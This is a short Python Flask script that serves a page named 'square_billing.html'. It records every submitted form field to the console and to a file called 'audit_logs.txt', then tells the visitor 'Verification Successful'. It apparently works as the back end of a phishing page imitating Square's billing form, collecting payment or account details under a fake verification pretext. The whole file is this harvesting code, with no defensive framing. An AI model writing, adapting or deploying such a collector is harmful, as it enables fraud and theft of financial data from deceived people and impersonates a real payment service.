from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('square_billing.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    print(f"[!] Data Received: {data}")
    with open('audit_logs.txt', 'a') as f:
        f.write(str(data) + "\n")
    return "Verification Successful"

if __name__ == '__main__':
    print("[*] Starting server on port 5000...")
    app.run(host='0.0.0.0', port=5000)
